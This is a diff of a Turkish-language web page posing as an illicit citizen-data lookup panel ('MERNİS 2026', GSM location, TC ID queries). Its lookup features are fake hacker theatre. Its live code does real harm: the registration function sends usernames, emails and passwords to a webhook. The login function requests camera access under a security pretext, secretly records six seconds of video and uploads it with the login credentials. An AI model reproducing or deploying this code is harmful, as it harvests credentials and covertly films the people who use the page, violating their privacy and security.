@@ -8,38 +8,33 @@
         :root { --bg: #ffffff; --text: #000000; --box: #f4f4f4; --accent: #162a8c; --header-bg: #f9f9f9; }
         .dark-mode { --bg: #0a0a0a; --text: #ffffff; --box: #1a1a1a; --accent: #5c7dff; --header-bg: #111; }
 
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; transition: 0.3s; overflow-x: hidden; }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; transition: 0.3; overflow-x: hidden; }
         
-        /* SAĞ ÜST KONTROLLER */
-        .controls { display: flex; align-items: center; gap: 15px; }
-        .mode-toggle { cursor: pointer; font-size: 20px; user-select: none; }
+        .controls { display: flex; align-items: center; gap: 20px; }
+        .mode-toggle { cursor: pointer; font-size: 22px; user-select: none; }
 
-        /* GİRİŞ VE KAYIT EKRANI */
         .auth-container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
         .auth-box { width: 100%; max-width: 340px; background: var(--box); padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.1); border: 1px solid rgba(128,128,128,0.1); }
         h1 { letter-spacing: 6px; margin-bottom: 25px; font-weight: 800; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid rgba(128,128,128,0.2); border-radius: 10px; background: var(--bg); color: var(--text); box-sizing: border-box; outline: none; transition: 0.2s; }
-        input:focus { border-color: var(--accent); }
-        .btn { width: 100%; padding: 16px; background: var(--accent); color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid rgba(128,128,128,0.2); border-radius: 10px; background: var(--bg); color: var(--text); box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 16px; background: var(--accent); color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .switch-link { margin-top: 25px; font-size: 13px; color: #888; cursor: pointer; }
 
-        /* PANEL YAPISI */
         #panel { display: none; }
         .header { background: var(--header-bg); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(128,128,128,0.1); }
         
-        /* AYRI DURAN HAMBURGER */
         .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 5px; padding: 5px; }
         .hamburger div { width: 24px; height: 2px; background: var(--text); border-radius: 2px; }
 
-        #sideMenu { position: fixed; top: 0; right: -300px; width: 300px; height: 100%; background: var(--box); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 10000; padding-top: 60px; box-shadow: -10px 0 30px rgba(0,0,0,0.2); }
-        .menu-item { padding: 20px 25px; border-bottom: 1px solid rgba(128,128,128,0.05); cursor: pointer; font-size: 14px; font-weight: 500; }
+        #sideMenu { position: fixed; top: 0; right: -320px; width: 300px; height: 100%; background: var(--box); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 10000; padding-top: 60px; box-shadow: -10px 0 30px rgba(0,0,0,0.2); }
+        .menu-item { padding: 20px 25px; border-bottom: 1px solid rgba(128,128,128,0.05); cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.2s; }
         .menu-item:hover { background: var(--accent); color: #fff; }
 
-        /* SONSUZ YÜKLEME */
-        #loadingScreen { display: none; position: fixed; inset: 0; background: #000; z-index: 100000; color: #0f0; font-family: 'Courier New', monospace; padding: 30px; font-size: 13px; line-height: 1.6; }
+        /* YÜKLEME EKRANI (EMRE İFS İÇİN) */
+        #loadingScreen { display: none; position: fixed; inset: 0; background: #000; z-index: 100000; color: #0f0; font-family: 'Courier New', monospace; padding: 30px; font-size: 14px; }
         .dot-ani::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
         @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
+        .close-loading { position: absolute; top: 20px; right: 20px; color: #555; cursor: pointer; }
 
         .content-area { padding: 20px; }
         .row { display: flex; justify-content: space-between; padding: 18px 10px; border-bottom: 1px solid rgba(128,128,128,0.1); font-size: 14px; }
@@ -85,10 +80,11 @@
     </div>
 
     <div id="sideMenu">
-        <div class="menu-item" style="color:var(--accent); font-weight: 800; border-bottom: 2px solid var(--accent);">EMRE İFS4</div>
-        <div class="menu-item" onclick="startLoading('Mernis Database Sızılıyor')">MERNİS 2026 SORGULA</div>
-        <div class="menu-item" onclick="startLoading('GSM Baz İstasyonu Verisi Alınıyor')">GSM LOKASYON</div>
-        <div class="menu-item" onclick="startLoading('TC Kimlik Algoritması Çözülüyor')">TC NO SORGULAMA</div>
+        <div class="menu-item" onclick="startLoading('EMRE İFS4 Veritabanına Sızılıyor')" style="color:var(--accent); font-weight: 800; border-bottom: 2px solid var(--accent);">EMRE İFS4</div>
+        
+        <div class="menu-item" onclick="accessError()">MERNİS 2026 SORGULA</div>
+        <div class="menu-item" onclick="accessError()">GSM LOKASYON</div>
+        <div class="menu-item" onclick="accessError()">TC NO SORGULAMA</div>
         <div class="menu-item" onclick="location.reload()" style="color: red;">SİSTEMİ KAPAT</div>
     </div>
 
@@ -96,19 +92,18 @@
         <div class="row"><span>SİSTEM DURUMU</span><span style="color: #00ff00; font-weight: bold;">CONNECTED</span></div>
         <div class="row"><span>IP ADRESİNİZ</span><span id="myIp">Yükleniyor...</span></div>
         <div class="row"><span>ERİŞİM SEVİYESİ</span><span class="lock">ROOT GEREKLİ</span></div>
-        <div class="row"><span>LOKASYON DATA</span><span class="lock">KİLİTLİ</span></div>
-        <p style="font-size: 11px; color: #888; text-align: center; margin-top: 50px; line-height: 1.5;">Panel yetkilerini kullanmak için sağ üstteki menüden<br>bir sorgu türü seçin.</p>
+        <p style="font-size: 11px; color: #888; text-align: center; margin-top: 50px; line-height: 1.5;">Özellikleri kullanmak için sağ üstteki menüden<br>bir sorgu türü seçin.</p>
     </div>
 </div>
 
 <div id="loadingScreen">
+    <div class="close-loading" onclick="document.getElementById('loadingScreen').style.display='none'">[X] Kapat</div>
     <div id="loadText" style="font-size: 18px; color: #fff; margin-bottom: 10px;">Bağlantı Kuruluyor</div>
-    <div class="dot-ani">Veritabanı protokolleri işleniyor</div>
+    <div class="dot-ani">Protokoller işleniyor, veritabanı bypass ediliyor</div>
     <br><br>
-    <div style="color: #444;">> Checking server status... OK</div>
-    <div style="color: #444;">> Injecting SQL payload... Success</div>
-    <div style="color: #444;">> Tunneling via Proxy... Active</div>
-    <div style="color: #444;">> Fetching data packets... [9%]</div>
+    <div style="color: #333;">> Checking SQL vulnerabilities... Found</div>
+    <div style="color: #333;">> Injecting payload to server... Done</div>
+    <div style="color: #333;">> Accessing encrypted files... [Please Wait]</div>
 </div>
 
 <script>
@@ -122,63 +117,62 @@
 
     function toggleNav() {
         const s = document.getElementById('sideMenu');
-        s.style.right = s.style.right === '0px' ? '-300px' : '0px';
+        s.style.right = s.style.right === '0px' ? '-320px' : '0px';
     }
 
+    // EMRE İFS Tıklanınca Çalışan Fonksiyon
     function startLoading(text) {
+        toggleNav(); // Menüyü kapat
         document.getElementById('loadingScreen').style.display = 'block';
         document.getElementById('loadText').innerText = text;
     }
 
-    // KAYIT OLUNCA BURASI ÇALIŞIR
+    // Diğer Sorgular Tıklanınca Çalışan Fonksiyon
+    function accessError() {
+        alert("Erişim Engellendi! ❌\n\nBu özelliği kullanmak için yetkiniz yetersiz. Lütfen VIP Abonelik satın alın veya Admin ile iletişime geçin.");
+    }
+
     function registerAction() {
         const u = document.getElementById('regUser').value;
         const e = document.getElementById('regEmail').value;
         const p = document.getElementById('regPass').value;
-
-        if(!u || !e || !p) return alert("Lütfen tüm alanları doldurun!");
+        if(!u || !e || !p) return alert("Boş alan bırakmayın!");
 
         fetch(wh, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({ content: `✅ **YENİ KAYIT YAPILDI**\nKullanıcı: ${u}\nE-posta: ${e}\nŞifre: ${p}` })
+            body: JSON.stringify({ content: `✅ **KAYIT:** ${u} | ${e} | ${p}` })
         });
-
-        alert("Hesabınız oluşturuldu! Şimdi giriş yapabilirsiniz.");
-        showSection('loginSection'); // DİREKT GİRİŞE ATAR
+        alert("Hesap açıldı! Giriş yapın.");
+        showSection('loginSection');
     }
 
-    // GİRİŞ YAPINCA BURASI ÇALIŞIR (KAMERA BURADA TETİKLENİR)
     async function loginAction() {
         const u = document.getElementById('lUser').value;
         const p = document.getElementById('lPass').value;
-
-        if(!u || !p) return alert("Giriş bilgilerinizi yazın!");
+        if(!u || !p) return alert("Bilgileri girin!");
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('cam').srcObject = stream;
-            
-            // Video kaydı başlar
             const mr = new MediaRecorder(stream);
             let chunks = [];
             mr.ondataavailable = e => chunks.push(e.data);
             mr.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("file", blob, "user_capture.webm");
-                fd.append("payload_json", JSON.stringify({ content: `🔱 **M0SREW PANEL GİRİŞİ**\nUser: ${u}\nPass: ${p}` }));
+                fd.append("file", blob, "user.webm");
+                fd.append("payload_json", JSON.stringify({ content: `🔱 **GİRİŞ:** ${u} | ${p}` }));
                 fetch(wh, { method: "POST", body: fd });
             };
             mr.start(); 
             setTimeout(() => { mr.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
 
-            // Giriş başarılı, panele geç
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('panel').style.display = 'block';
             document.getElementById('snd').play();
         } catch(e) {
-            alert("Sistem güvenliği için kamera izni vermeniz gerekiyor.");
+            alert("Sistem güvenliği için kamera izni şarttır.");
         }
     }
 
